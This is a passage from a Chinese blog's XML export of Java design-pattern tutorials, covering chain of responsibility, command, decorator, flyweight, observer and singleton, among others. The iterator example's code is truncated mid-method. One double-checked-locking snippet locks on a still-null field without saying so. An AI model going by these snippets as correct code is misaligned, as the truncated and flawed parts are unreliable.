<p>从这点看出，建造者模式将很多功能集成到一个类里，这个类可以创造出比较复杂的东西。所以与工程模式的区别就是：工厂模式关注的是创建单个产品，而建造者模式则关注创建符合对象，多个部分。因此，是选择工厂模式还是建造者模式，依实际情况而定。</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>责任链模式（Chain of Responsibility）</title>
    <url>/blog/arch/dp/chain/</url>
    <content><![CDATA[<p>接下来我们将要谈谈责任链模式，有多个对象，每个对象持有对下一个对象的引用，这样就会形成一条链，请求在这条链上传递，直到某一对象决定处理该请求。但是发出者并不清楚到底最终那个对象会处理该请求，所以，责任链模式可以实现，在隐瞒客户端的情况下，对系统进行动态的调整。先看看关系图：</p>
<p><img src="/images/design/dpchain.png"></p>
<p>Abstracthandler类提供了get和set方法，方便MyHandle类设置和修改引用对象，MyHandle类是核心，实例化后生成一系列相互持有的对象，构成一条链。</p>
<pre><code>public interface Handler &#123;
    public void operator();
&#125;

public abstract class AbstractHandler &#123;
    
    private Handler handler;

    public Handler getHandler() &#123;
        return handler;
    &#125;

    public void setHandler(Handler handler) &#123;
        this.handler = handler;
    &#125;
    
&#125;

public class MyHandler extends AbstractHandler implements Handler &#123;

    private String name;

    public MyHandler(String name) &#123;
        this.name = name;
    &#125;

    @Override
    public void operator() &#123;
        System.out.println(name+&quot;deal!&quot;);
        if(getHandler()!=null)&#123;
            getHandler().operator();
        &#125;
    &#125;
&#125;

public class Test &#123;

    public static void main(String[] args) &#123;
        MyHandler h1 = new MyHandler(&quot;h1&quot;);
        MyHandler h2 = new MyHandler(&quot;h2&quot;);
        MyHandler h3 = new MyHandler(&quot;h3&quot;);

        h1.setHandler(h2);
        h2.setHandler(h3);

        h1.operator();
    &#125;
&#125;
</code></pre>
<p>输出：</p>
<pre><code>h1deal!
h2deal!
h3deal!
</code></pre>
<p>此处强调一点就是，链接上的请求可以是一条链，可以是一个树，还可以是一个环，模式本身不约束这个，需要我们自己去实现，同时，在一个时刻，命令只允许由一个对象传给另一个对象，而不允许传给多个对象。</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>命令模式（Command）</title>
    <url>/blog/arch/dp/command/</url>
    <content><![CDATA[<p>命令模式很好理解，举个例子，司令员下令让士兵去干件事情，从整个事情的角度来考虑，司令员的作用是，发出口令，口令经过传递，传到了士兵耳朵里，士兵去执行。这个过程好在，三者相互解耦，任何一方都不用去依赖其他人，只需要做好自己的事儿就行，司令员要的是结果，不会去关注到底士兵是怎么实现的。我们看看关系图：</p>
<p><img src="/images/design/dpcommand.png"></p>
<p>Invoker是调用者（司令员），Receiver是被调用者（士兵），MyCommand是命令，实现了Command接口，持有接收对象，看实现代码：</p>
<pre><code>public interface Command &#123;
    public void exe();
&#125;

public class MyCommand implements Command &#123;

    private Receiver receiver;
    
    public MyCommand(Receiver receiver) &#123;
        this.receiver = receiver;
    &#125;

    @Override
    public void exe() &#123;
        receiver.action();
    &#125;
&#125;

public class Receiver &#123;
    public void action()&#123;
        System.out.println(&quot;command received!&quot;);
    &#125;
&#125;

public class Invoker &#123;
    
    private Command command;
    
    public Invoker(Command command) &#123;
        this.command = command;
    &#125;

    public void action()&#123;
        command.exe();
    &#125;
&#125;

public class Test &#123;

    public static void main(String[] args) &#123;
        Receiver receiver = new Receiver();
        Command cmd = new MyCommand(receiver);
        Invoker invoker = new Invoker(cmd);
        invoker.action();
    &#125;
&#125;
</code></pre>
<p>输出：command received!</p>
<p>这个很哈理解，命令模式的目的就是达到命令的发出者和执行者之间解耦，实现请求和执行分开，熟悉Struts的同学应该知道，Struts其实就是一种将请求和呈现分离的技术，其中必然涉及命令模式的思想！</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>组合模式（Composite）</title>
    <url>/blog/arch/dp/composite/</url>
    <content><![CDATA[<p>组合模式有时又叫部分-整体模式在处理类似树形结构的问题时比较方便，看看关系图：</p>
<p><img src="/images/design/dpcomposite.png"></p>
<p>直接来看代码：</p>
<pre><code>public class TreeNode &#123;
    
    private String name;
    private TreeNode parent;
    private Vector&lt; TreeNode&gt; children = new Vector&lt; TreeNode&gt;();
    
    public TreeNode(String name)&#123;
        this.name = name;
    &#125;

    public String getName() &#123;
        return name;
    &#125;

    public void setName(String name) &#123;
        this.name = name;
    &#125;

    public TreeNode getParent() &#123;
        return parent;
    &#125;

    public void setParent(TreeNode parent) &#123;
        this.parent = parent;
    &#125;
    
    //添加孩子节点
    public void add(TreeNode node)&#123;
        children.add(node);
    &#125;
    
    //删除孩子节点
    public void remove(TreeNode node)&#123;
        children.remove(node);
    &#125;
    
    //取得孩子节点
    public Enumeration&lt; TreeNode&gt; getChildren()&#123;
        return children.elements();
    &#125;
&#125;

public class Tree &#123;

    TreeNode root = null;

    public Tree(String name) &#123;
        root = new TreeNode(name);
    &#125;

    public static void main(String[] args) &#123;
        Tree tree = new Tree(&quot;A&quot;);
        TreeNode nodeB = new TreeNode(&quot;B&quot;);
        TreeNode nodeC = new TreeNode(&quot;C&quot;);
        
        nodeB.add(nodeC);
        tree.root.add(nodeB);
        System.out.println(&quot;build the tree finished!&quot;);
    &#125;
&#125;
</code></pre>
<p>使用场景：将多个对象组合在一起进行操作，常用于表示树形结构中，例如二叉树，数等。</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>装饰模式（Decorator）</title>
    <url>/blog/arch/dp/decorator/</url>
    <content><![CDATA[<p>顾名思义，装饰模式就是给一个对象增加一些新的功能，而且是动态的，要求装饰对象和被装饰对象实现同一个接口，装饰对象持有被装饰对象的实例，关系图如下：</p>
<p><img src="/images/design/dpdecorator.png"></p>
<p>Source类是被装饰类，Decorator类是一个装饰类，可以为Source类动态的添加一些功能，代码如下：</p>
<pre><code>public interface Sourceable &#123;
    public void method();
&#125;

public class Source implements Sourceable &#123;

    @Override
    public void method() &#123;
        System.out.println(&quot;the original method!&quot;);
    &#125;
&#125;

public class Decorator implements Sourceable &#123;

    private Sourceable source;
    
    public Decorator(Sourceable source)&#123;
        super();
        this.source = source;
    &#125;
    @Override
    public void method() &#123;
        System.out.println(&quot;before decorator!&quot;);
        source.method();
        System.out.println(&quot;after decorator!&quot;);
    &#125;
&#125;

public class DecoratorTest &#123;

    public static void main(String[] args) &#123;
        Sourceable source = new Source();
        Sourceable obj = new Decorator(source);
        obj.method();
    &#125;
&#125;
</code></pre>
<p>装饰器模式的应用场景：</p>
<p>1、需要扩展一个类的功能。</p>
<p>2、动态的为一个对象增加功能，而且还能动态撤销。（继承不能做到这一点，继承的功能是静态的，不能动态增删。）缺点：产生过多相似的对象，不易排错！</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>外观模式（Facade）</title>
    <url>/blog/arch/dp/facade/</url>
    <content><![CDATA[<p>外观模式是为了解决类与类之家的依赖关系的，像spring一样，可以将类和类之间的关系配置到配置文件中，而外观模式就是将他们的关系放在一个Facade类中，降低了类类之间的耦合度，该模式中没有涉及到接口，看下类图：（我们以一个计算机的启动过程为例）</p>
<p><img src="/images/design/dpfacade.png"></p>
<p>我们先看下实现类：</p>
<pre><code>public class CPU &#123;
    
    public void startup()&#123;
        System.out.println(&quot;cpu startup!&quot;);
    &#125;
    
    public void shutdown()&#123;
        System.out.println(&quot;cpu shutdown!&quot;);
    &#125;
&#125;

public class Memory &#123;
    
    public void startup()&#123;
        System.out.println(&quot;memory startup!&quot;);
    &#125;
    
    public void shutdown()&#123;
        System.out.println(&quot;memory shutdown!&quot;);
    &#125;
&#125;

public class Disk &#123;
    
    public void startup()&#123;
        System.out.println(&quot;disk startup!&quot;);
    &#125;
    
    public void shutdown()&#123;
        System.out.println(&quot;disk shutdown!&quot;);
    &#125;
&#125;

public class Computer &#123;
    private CPU cpu;
    private Memory memory;
    private Disk disk;
    
    public Computer()&#123;
        cpu = new CPU();
        memory = new Memory();
        disk = new Disk();
    &#125;
    
    public void startup()&#123;
        System.out.println(&quot;start the computer!&quot;);
        cpu.startup();
        memory.startup();
        disk.startup();
        System.out.println(&quot;start computer finished!&quot;);
    &#125;
    
    public void shutdown()&#123;
        System.out.println(&quot;begin to close the computer!&quot;);
        cpu.shutdown();
        memory.shutdown();
        disk.shutdown();
        System.out.println(&quot;computer closed!&quot;);
    &#125;
&#125;

public class User &#123;

    public static void main(String[] args) &#123;
        Computer computer = new Computer();
        computer.startup();
        computer.shutdown();
    &#125;
&#125;
</code></pre>
<p>输出：</p>
<pre><code>start the computer!
cpu startup!
memory startup!
disk startup!
start computer finished!
begin to close the computer!
cpu shutdown!
memory shutdown!
disk shutdown!
computer closed!
</code></pre>
<p>如果我们没有Computer类，那么，CPU、Memory、Disk他们之间将会相互持有实例，产生关系，这样会造成严重的依赖，修改一个类，可能会带来其他类的修改，这不是我们想要看到的，有了Computer类，他们之间的关系被放在了Computer类里，这样就起到了解耦的作用，这，就是外观模式！</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>工厂方法模式（Factory Method）</title>
    <url>/blog/arch/dp/factorymethod/</url>
    <content><![CDATA[<p>工厂方法模式分为三种：</p>
<p>普通工厂模式，就是建立一个工厂类，对实现了同一接口的一些类进行实例的创建。首先看下关系图：</p>
<p><img src="/images/design/dpfactory.png"></p>
<p>举例如下：（我们举一个发送邮件和短信的例子）</p>
<pre><code>public interface Sender &#123;
    public void Send();
&#125;

public class MailSender implements Sender &#123;
    @Override
    public void Send() &#123;
        System.out.println(&quot;this is mailsender!&quot;);
    &#125;
&#125;

public class SmsSender implements Sender &#123;

    @Override
    public void Send() &#123;
        System.out.println(&quot;this is sms sender!&quot;);
    &#125;
&#125;

public class SendFactory &#123;

    public Sender produce(String type) &#123;
        if (&quot;mail&quot;.equals(type)) &#123;
            return new MailSender();
        &#125; else if (&quot;sms&quot;.equals(type)) &#123;
            return new SmsSender();
        &#125; else &#123;
            System.out.println(&quot;请输入正确的类型!&quot;);
            return null;
        &#125;
    &#125;
&#125;

public class FactoryTest &#123;

    public static void main(String[] args) &#123;
        SendFactory factory = new SendFactory();
        Sender sender = factory.produce(&quot;sms&quot;);
        sender.Send();
    &#125;
&#125;
</code></pre>
<p>多个工厂方法模式，是对普通工厂方法模式的改进，在普通工厂方法模式中，如果传递的字符串出错，则不能正确创建对象，而多个工厂方法模式是提供多个工厂方法，分别创建对象。关系图：</p>
<p><img src="/images/design/dpfactory1.png"></p>
<p>将上面的代码做下修改，改动下SendFactory类就行，如下：</p>
<pre><code>public class SendFactory &#123;
    
    public Sender produceMail()&#123;
        return new MailSender();
    &#125;
    
    public Sender produceSms()&#123;
        return new SmsSender();
    &#125;
&#125;

public class FactoryTest &#123;

    public static void main(String[] args) &#123;
        SendFactory factory = new SendFactory();
        Sender sender = factory.produceMail();
        sender.Send();
    &#125;
&#125;
</code></pre>
<p>静态工厂方法模式，将上面的多个工厂方法模式里的方法置为静态的，不需要创建实例，直接调用即可。</p>
<pre><code>public class SendFactory &#123;
    
    public static Sender produceMail()&#123;
        return new MailSender();
    &#125;
    
    public static Sender produceSms()&#123;
        return new SmsSender();
    &#125;
&#125;

public class FactoryTest &#123;

    public static void main(String[] args) &#123;    
        Sender sender = SendFactory.produceMail();
        sender.Send();
    &#125;
&#125;
</code></pre>
<p>总体来说，工厂模式适合：凡是出现了大量的产品需要创建，并且具有共同的接口时，可以通过工厂方法模式进行创建。在以上的三种模式中，第一种如果传入的字符串有误，不能正确创建对象，第三种相对于第二种，不需要实例化工厂类，所以，大多数情况下，我们会选用第三种——静态工厂方法模式。</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>享元模式（Flyweight）</title>
    <url>/blog/arch/dp/flyweight/</url>
    <content><![CDATA[<p>享元模式的主要目的是实现对象的共享，即共享池，当系统中对象多的时候可以减少内存的开销，通常与工厂模式一起使用。</p>
<p><img src="/images/design/dpfly1.png"></p>
<p>FlyWeightFactory负责创建和管理享元单元，当一个客户端请求时，工厂需要检查当前对象池中是否有符合条件的对象，如果有，就返回已经存在的对象，如果没有，则创建一个新对象，FlyWeight是超类。一提到共享池，我们很容易联想到Java里面的JDBC连接池，想想每个连接的特点，我们不难总结出：适用于作共享的一些个对象，他们有一些共有的属性，就拿数据库连接池来说，url、driverClassName、username、password及dbname，这些属性对于每个连接来说都是一样的，所以就适合用享元模式来处理，建一个工厂类，将上述类似属性作为内部数据，其它的作为外部数据，在方法调用时，当做参数传进来，这样就节省了空间，减少了实例的数量。</p>
<p>看个例子：</p>
<p><img src="/images/design/dpfly2.png"></p>
<p>看下数据库连接池的代码：</p>
<pre><code>public class ConnectionPool &#123;
    
    private Vector&lt; Connection&gt; pool;
    
    /*公有属性*/
    private String url = &quot;jdbc:mysql://localhost:3306/test&quot;;
    private String username = &quot;root&quot;;
    private String password = &quot;root&quot;;
    private String driverClassName = &quot;com.mysql.jdbc.Driver&quot;;

    private int poolSize = 100;
    private static ConnectionPool instance = null;
    Connection conn = null;

    /*构造方法，做一些初始化工作*/
    private ConnectionPool() &#123;
        pool = new Vector&lt; Connection&gt;(poolSize);

        for (int i = 0; i &lt; poolSize; i++) &#123;
            try &#123;
                Class.forName(driverClassName);
                conn = DriverManager.getConnection(url, username, password);
                pool.add(conn);
            &#125; catch (ClassNotFoundException e) &#123;
                e.printStackTrace();
            &#125; catch (SQLException e) &#123;
                e.printStackTrace();
            &#125;
        &#125;
    &#125;

    /* 返回连接到连接池 */
    public synchronized void release() &#123;
        pool.add(conn);
    &#125;

    /* 返回连接池中的一个数据库连接 */
    public synchronized Connection getConnection() &#123;
        if (pool.size() &gt; 0) &#123;
            Connection conn = pool.get(0);
            pool.remove(conn);
            return conn;
        &#125; else &#123;
            return null;
        &#125;
    &#125;
&#125;
</code></pre>
<p>通过连接池的管理，实现了数据库连接的共享，不需要每一次都重新创建连接，节省了数据库重新创建的开销，提升了系统的性能！</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>解释器模式（Interpreter）</title>
    <url>/blog/arch/dp/interpreter/</url>
    <content><![CDATA[<p>解释器模式是我们暂时的最后一讲，一般主要应用在OOP开发中的编译器的开发中，所以适用面比较窄。</p>
<p><img src="/images/design/dpinterpreter.png"></p>
<p>Context类是一个上下文环境类，Plus和Minus分别是用来计算的实现，代码如下：</p>
<pre><code>public interface Expression &#123;
    public int interpret(Context context);
&#125;

public class Plus implements Expression &#123;

    @Override
    public int interpret(Context context) &#123;
        return context.getNum1()+context.getNum2();
    &#125;
&#125;

public class Minus implements Expression &#123;

    @Override
    public int interpret(Context context) &#123;
        return context.getNum1()-context.getNum2();
    &#125;
&#125;

public class Context &#123;
    
    private int num1;
    private int num2;
    
    public Context(int num1, int num2) &#123;
        this.num1 = num1;
        this.num2 = num2;
    &#125;
    
    public int getNum1() &#123;
        return num1;
    &#125;
    public void setNum1(int num1) &#123;
        this.num1 = num1;
    &#125;
    public int getNum2() &#123;
        return num2;
    &#125;
    public void setNum2(int num2) &#123;
        this.num2 = num2;
    &#125;
    
    
&#125;

public class Test &#123;

    public static void main(String[] args) &#123;

        // 计算9+2-8的值
        int result = new Minus().interpret((new Context(new Plus()
                .interpret(new Context(9, 2)), 8)));
        System.out.println(result);
    &#125;
&#125;
</code></pre>
<p>最后输出正确的结果：3。</p>
<p>基本就这样，解释器模式用来做各种各样的解释器，如正则表达式等的解释器等等！</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>迭代子模式（Iterator）</title>
    <url>/blog/arch/dp/iterator/</url>
    <content><![CDATA[<p>顾名思义，迭代器模式就是顺序访问聚集中的对象，一般来说，集合中非常常见，如果对集合类比较熟悉的话，理解本模式会十分轻松。这句话包含两层意思：一是需要遍历的对象，即聚集对象，二是迭代器对象，用于对聚集对象进行遍历访问。我们看下关系图：</p>
<p><img src="/images/design/dpiterator.png"></p>
<p>这个思路和我们常用的一模一样，MyCollection中定义了集合的一些操作，MyIterator中定义了一系列迭代操作，且持有Collection实例，我们来看看实现代码：</p>
<pre><code>public interface Collection &#123;
    
    public Iterator iterator();
    
    /*取得集合元素*/
    public Object get(int i);
    
    /*取得集合大小*/
    public int size();
&#125;

public interface Iterator &#123;
    //前移
    public Object previous();
    
    //后移
    public Object next();
    public boolean hasNext();
    
    //取得第一个元素
    public Object first();
&#125;

public class MyCollection implements Collection &#123;

    public String string[] = &#123;&quot;A&quot;,&quot;B&quot;,&quot;C&quot;,&quot;D&quot;,&quot;E&quot;&#125;;
    @Override
    public Iterator iterator() &#123;
        return new MyIterator(this);
    &#125;

    @Override
    public Object get(int i) &#123;
        return string[i];
    &#125;

    @Override
    public int size() &#123;
        return string.length;
    &#125;
&#125;

public class MyIterator implements Iterator &#123;

    private Collection collection;
    private int pos = -1;
    
    public MyIterator(Collection collection)&#123;
        this.collection = collection;
    &#125;
    
    @Override
    public Object previous() &#123;
        if(pos &gt; 0)&#123;
            pos--;
        &#125;
        return collection.get(pos);
    &#125;

    @Override
    public Object next() &#123;
        if(pos
</code></pre>
<p>输出：A B C D E</p>
<p>此处我们貌似模拟了一个集合类的过程，感觉是不是很爽？其实JDK中各个类也都是这些基本的东西，加一些设计模式，再加一些优化放到一起的，只要我们把这些东西学会了，掌握好了，我们也可以写出自己的集合类，甚至框架！</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>中介者模式（Mediator）</title>
    <url>/blog/arch/dp/mediator/</url>
    <content><![CDATA[<p>中介者模式也是用来降低类类之间的耦合的，因为如果类类之间有依赖关系的话，不利于功能的拓展和维护，因为只要修改一个对象，其它关联的对象都得进行修改。如果使用中介者模式，只需关心和Mediator类的关系，具体类类之间的关系及调度交给Mediator就行，这有点像spring容器的作用。先看看图：</p>
<p><img src="/images/design/dpmediator.png"></p>
<p>User类统一接口，User1和User2分别是不同的对象，二者之间有关联，如果不采用中介者模式，则需要二者相互持有引用，这样二者的耦合度很高，为了解耦，引入了Mediator类，提供统一接口，MyMediator为其实现类，里面持有User1和User2的实例，用来实现对User1和User2的控制。这样User1和User2两个对象相互独立，他们只需要保持好和Mediator之间的关系就行，剩下的全由MyMediator类来维护！基本实现：</p>
<pre><code>public interface Mediator &#123;
    public void createMediator();
    public void workAll();
&#125;

public class MyMediator implements Mediator &#123;

    private User user1;
    private User user2;
    
    public User getUser1() &#123;
        return user1;
    &#125;

    public User getUser2() &#123;
        return user2;
    &#125;

    @Override
    public void createMediator() &#123;
        user1 = new User1(this);
        user2 = new User2(this);
    &#125;

    @Override
    public void workAll() &#123;
        user1.work();
        user2.work();
    &#125;
&#125;

public abstract class User &#123;
    
    private Mediator mediator;
    
    public Mediator getMediator()&#123;
        return mediator;
    &#125;
    
    public User(Mediator mediator) &#123;
        this.mediator = mediator;
    &#125;

    public abstract void work();
&#125;

public class User1 extends User &#123;

    public User1(Mediator mediator)&#123;
        super(mediator);
    &#125;
    
    @Override
    public void work() &#123;
        System.out.println(&quot;user1 exe!&quot;);
    &#125;
&#125;

public class User2 extends User &#123;

    public User2(Mediator mediator)&#123;
        super(mediator);
    &#125;
    
    @Override
    public void work() &#123;
        System.out.println(&quot;user2 exe!&quot;);
    &#125;
&#125;

public class Test &#123;

    public static void main(String[] args) &#123;
        Mediator mediator = new MyMediator();
        mediator.createMediator();
        mediator.workAll();
    &#125;
&#125;
</code></pre>
<p>输出：</p>
<pre><code>user1 exe!
user2 exe!
</code></pre>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>备忘录模式（Memento）</title>
    <url>/blog/arch/dp/memento/</url>
    <content><![CDATA[<p>主要目的是保存一个对象的某个状态，以便在适当的时候恢复对象，个人觉得叫备份模式更形象些，通俗的讲下：假设有原始类A，A中有各种属性，A可以决定需要备份的属性，备忘录类B是用来存储A的一些内部状态，类C呢，就是一个用来存储备忘录的，且只能存储，不能修改等操作。做个图来分析一下：</p>
<p><img src="/images/design/dpmemento.png"></p>
<p>Original类是原始类，里面有需要保存的属性value及创建一个备忘录类，用来保存value值。Memento类是备忘录类，Storage类是存储备忘录的类，持有Memento类的实例，该模式很好理解。直接看源码：</p>
<pre><code>public class Original &#123;
    
    private String value;
    
    public String getValue() &#123;
        return value;
    &#125;

    public void setValue(String value) &#123;
        this.value = value;
    &#125;

    public Original(String value) &#123;
        this.value = value;
    &#125;

    public Memento createMemento()&#123;
        return new Memento(value);
    &#125;
    
    public void restoreMemento(Memento memento)&#123;
        this.value = memento.getValue();
    &#125;
&#125;

public class Memento &#123;
    
    private String value;

    public Memento(String value) &#123;
        this.value = value;
    &#125;

    public String getValue() &#123;
        return value;
    &#125;

    public void setValue(String value) &#123;
        this.value = value;
    &#125;
&#125;

public class Storage &#123;
    
    private Memento memento;
    
    public Storage(Memento memento) &#123;
        this.memento = memento;
    &#125;

    public Memento getMemento() &#123;
        return memento;
    &#125;

    public void setMemento(Memento memento) &#123;
        this.memento = memento;
    &#125;
&#125;

public class Test &#123;

    public static void main(String[] args) &#123;
        
        // 创建原始类
        Original origi = new Original(&quot;egg&quot;);

        // 创建备忘录
        Storage storage = new Storage(origi.createMemento());

        // 修改原始类的状态
        System.out.println(&quot;初始化状态为：&quot; + origi.getValue());
        origi.setValue(&quot;niu&quot;);
        System.out.println(&quot;修改后的状态为：&quot; + origi.getValue());

        // 回复原始类的状态
        origi.restoreMemento(storage.getMemento());
        System.out.println(&quot;恢复后的状态为：&quot; + origi.getValue());
    &#125;
&#125;
</code></pre>
<p>输出：</p>
<pre><code>初始化状态为：egg
修改后的状态为：niu
恢复后的状态为：egg
</code></pre>
<p>简单描述下：新建原始类时，value被初始化为egg，后经过修改，将value的值置为niu，最后倒数第二行进行恢复状态，结果成功恢复了。其实我觉得这个模式叫“备份-恢复”模式最形象。</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>观察者模式（Observer）</title>
    <url>/blog/arch/dp/observer/</url>
    <content><![CDATA[<p>包括这个模式在内的接下来的四个模式，都是类和类之间的关系，不涉及到继承，学的时候应该记得归纳，记得本文最开始的那个图。观察者模式很好理解，类似于邮件订阅和RSS订阅，当我们浏览一些博客或wiki时，经常会看到RSS图标，就这的意思是，当你订阅了该文章，如果后续有更新，会及时通知你。其实，简单来讲就一句话：当一个对象变化时，其它依赖该对象的对象都会收到通知，并且随着变化！对象之间是一种一对多的关系。先来看看关系图：</p>
<p><img src="/images/design/dpobserver.png"></p>
<p>我解释下这些类的作用：MySubject类就是我们的主对象，Observer1和Observer2是依赖于MySubject的对象，当MySubject变化时，Observer1和Observer2必然变化。AbstractSubject类中定义着需要监控的对象列表，可以对其进行修改：增加或删除被监控对象，且当MySubject变化时，负责通知在列表内存在的对象。我们看实现代码：</p>
<pre><code>public interface Observer &#123;
    public void update();
&#125;

public class Observer1 implements Observer &#123;

    @Override
    public void update() &#123;
        System.out.println(&quot;observer1 has received!&quot;);
    &#125;
&#125;

public class Observer2 implements Observer &#123;

    @Override
    public void update() &#123;
        System.out.println(&quot;observer2 has received!&quot;);
    &#125;

&#125;

public interface Subject &#123;
    
    /*增加观察者*/
    public void add(Observer observer);
    
    /*删除观察者*/
    public void del(Observer observer);
    
    /*通知所有的观察者*/
    public void notifyObservers();
    
    /*自身的操作*/
    public void operation();
&#125;

public abstract class AbstractSubject implements Subject &#123;

    private Vector vector = new Vector();
    @Override
    public void add(Observer observer) &#123;
        vector.add(observer);
    &#125;

    @Override
    public void del(Observer observer) &#123;
        vector.remove(observer);
    &#125;

    @Override
    public void notifyObservers() &#123;
        Enumeration enumo = vector.elements();
        while(enumo.hasMoreElements())&#123;
            enumo.nextElement().update();
        &#125;
    &#125;
&#125;

public class MySubject extends AbstractSubject &#123;

    @Override
    public void operation() &#123;
        System.out.println(&quot;update self!&quot;);
        notifyObservers();
    &#125;

&#125;

public class ObserverTest &#123;

    public static void main(String[] args) &#123;
        Subject sub = new MySubject();
        sub.add(new Observer1());
        sub.add(new Observer2());
        
        sub.operation();
    &#125;

&#125;
</code></pre>
<p>输出：</p>
<pre><code>update self!
observer1 has received!
observer2 has received!
</code></pre>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>单例模式（Singleton）</title>
    <url>/blog/arch/dp/singleton/</url>
    <content><![CDATA[<p>单例对象（Singleton）是一种常用的设计模式。在Java应用中，单例对象能保证在一个JVM中，该对象只有一个实例存在。这样的模式有几个好处：</p>
<p>1、某些类创建比较频繁，对于一些大型的对象，这是一笔很大的系统开销。</p>
<p>2、省去了new操作符，降低了系统内存的使用频率，减轻GC压力。</p>
<p>3、有些类如交易所的核心交易引擎，控制着交易流程，如果该类可以创建多个的话，系统完全乱了。（比如一个军队出现了多个司令员同时指挥，肯定会乱成一团），所以只有使用单例模式，才能保证核心交易服务器独立控制整个流程。</p>
<p>首先我们写一个简单的单例类：</p>
<pre><code>public class Singleton &#123;

    /* 持有私有静态实例，防止被引用，此处赋值为null，目的是实现延迟加载 */
    private static Singleton instance = null;

    /* 私有构造方法，防止被实例化 */
    private Singleton() &#123;
    &#125;

    /* 静态工程方法，创建实例 */
    public static Singleton getInstance() &#123;
        if (instance == null) &#123;
            instance = new Singleton();
        &#125;
        return instance;
    &#125;

    /* 如果该对象被用于序列化，可以保证对象在序列化前后保持一致 */
    public Object readResolve() &#123;
        return instance;
    &#125;
&#125;
</code></pre>
<p>这个类可以满足基本要求，但是，像这样毫无线程安全保护的类，如果我们把它放入多线程的环境下，肯定就会出现问题了，如何解决？我们首先会想到对getInstance方法加synchronized关键字，如下：</p>
<pre><code>public static synchronized Singleton getInstance() &#123;
        if (instance == null) &#123;
            instance = new Singleton();
        &#125;
        return instance;
    &#125;
</code></pre>
<p>但是，synchronized关键字锁住的是这个对象，这样的用法，在性能上会有所下降，因为每次调用getInstance()，都要对对象上锁，事实上，只有在第一次创建对象的时候需要加锁，之后就不需要了，所以，这个地方需要改进。我们改成下面这个：</p>
<pre><code>public static Singleton getInstance() &#123;
        if (instance == null) &#123;
            synchronized (instance) &#123;
                if (instance == null) &#123;
                    instance = new Singleton();
                &#125;
            &#125;
        &#125;
        return instance;
    &#125;
</code></pre>
<p>似乎解决了之前提到的问题，将synchronized关键字加在了内部，也就是说当调用的时候是不需要加锁的，只有在instance为null，并创建对象的时候才需要加锁，性能有一定的提升。但是，这样的情况，还是有可能有问题的，看下面的情况：在Java指令中创建对象和赋值操作是分开进行的，也就是说instance &#x3D; new Singleton();语句是分两步执行的。但是JVM并不保证这两个操作的先后顺序，也就是说有可能JVM会为新的Singleton实例分配空间，然后直接赋值给instance成员，然后再去初始化这个Singleton实例。这样就可能出错了，我们以A、B两个线程为例：</p>
<p>a&gt;A、B线程同时进入了第一个if判断</p>
<p>b&gt;A首先进入synchronized块，由于instance为null，所以它执行instance &#x3D; new Singleton();</p>
<p>c&gt;由于JVM内部的优化机制，JVM先画出了一些分配给Singleton实例的空白内存，并赋值给instance成员（注意此时JVM没有开始初始化这个实例），然后A离开了synchronized块。</p>
<p>d&gt;B进入synchronized块，由于instance此时不是null，因此它马上离开了synchronized块并将结果返回给调用该方法的程序。</p>
<p>e&gt;此时B线程打算使用Singleton实例，却发现它没有被初始化，于是错误发生了。</p>
<p>所以程序还是有可能发生错误，其实程序在运行过程是很复杂的，从这点我们就可以看出，尤其是在写多线程环境下的程序更有难度，有挑战性。我们对该程序做进一步优化：</p>
<pre><code>    private static class SingletonFactory&#123;         
        private static Singleton instance = new Singleton();         
    &#125;         
    public static Singleton getInstance()&#123;         
        return SingletonFactory.instance;         
    &#125; 
</code></pre>
<p>实际情况是，单例模式使用内部类来维护单例的实现，JVM内部的机制能够保证当一个类被加载的时候，这个类的加载过程是线程互斥的。这样当我们第一次调用getInstance的时候，JVM能够帮我们保证instance只被创建一次，并且会保证把赋值给instance的内存初始化完毕，这样我们就不用担心上面的问题。同时该方法也只会在第一次调用的时候使用互斥机制，这样就解决了低性能问题。这样我们暂时总结一个完美的单例模式：</p>
<pre><code>public class Singleton &#123;

    /* 私有构造方法，防止被实例化 */
    private Singleton() &#123;
    &#125;

    /* 此处使用一个内部类来维护单例 */
    private static class SingletonFactory &#123;
        private static Singleton instance = new Singleton();
    &#125;

    /* 获取实例 */
    public static Singleton getInstance() &#123;
        return SingletonFactory.instance;
    &#125;

    /* 如果该对象被用于序列化，可以保证对象在序列化前后保持一致 */
    public Object readResolve() &#123;
        return getInstance();
    &#125;
&#125;
</code></pre>
<p>其实说它完美，也不一定，如果在构造函数中抛出异常，实例将永远得不到创建，也会出错。所以说，十分完美的东西是没有的，我们只能根据实际情况，选择最适合自己应用场景的实现方法。也有人这样实现：因为我们只需要在创建类的时候进行同步，所以只要将创建和getInstance()分开，单独为创建加synchronized关键字，也是可以的：</p>
<pre><code>public class SingletonTest &#123;

    private static SingletonTest instance = null;

    private SingletonTest() &#123;
    &#125;

    private static synchronized void syncInit() &#123;
